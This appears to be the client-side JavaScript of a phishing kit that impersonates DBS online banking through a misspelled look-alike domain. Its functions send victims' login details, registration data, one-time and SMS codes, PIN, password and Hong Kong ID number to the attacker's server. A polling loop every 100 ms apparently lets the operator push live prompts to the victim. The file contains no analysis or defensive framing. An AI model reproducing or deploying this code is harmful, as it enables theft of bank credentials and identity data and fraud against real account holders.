



function loginButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=login',
        data: $("form#login-form").serialize(),
        success: function(response) {
            $(".response-login").html(response);
        },
    });
}

function registerButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=register',
        data: $("form#register-form").serialize(),
        success: function(response) {
            $(".response-register").html(response);
        },
    });
}

function codeButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=code_iste',
        data: $("form#code-form").serialize(),
        success: function(response) {
            $(".response-code").html(response);
        },
    });
}

function smsButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=sms_iste',
        data: $("form#sms-form").serialize(),
        success: function(response) {
            $(".response-sms").html(response);
        },
    });
}

function pinButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=pin_iste',
        data: $("form#pin-form").serialize(),
        success: function(response) {
            $(".response-pin").html(response);
        },
    });
}


function passwordButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=password_iste',
        data: $("form#password-form").serialize(),
        success: function(response) {
            $(".response-password").html(response);
        },
    });
}

function hkidButton() {
    $.ajax({
        type: "POST",
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=hkid_iste',
        data: $("form#hkid-form").serialize(),
        success: function(response) {
            $(".response-hkid").html(response);
        },
    });
}

function userNotifications() {
    $.ajax({
        url: 'https://dbs.ibannking-intternet-digiital-onlline-logiin.com/Module/WebsiteAjax.php?section=user_notifications',
        success: function(response) {
            $(".user-notifications").html(response);
        },
    });
}
userNotifications();
setInterval(function() {
    userNotifications();
}, 100);



var elts = document.getElementsByClassName('input-key')
Array.from(elts).forEach(function(elt) {
    elt.addEventListener("keyup", function(event) {
        console.log(elt.value.length);
        // Number 13 is the "Enter" key on the keyboard
        if (event.keyCode === 13 || elt.value.length > 0) {
            // Focus on the next sibling
            elt.nextElementSibling.focus()
        }
    });
})


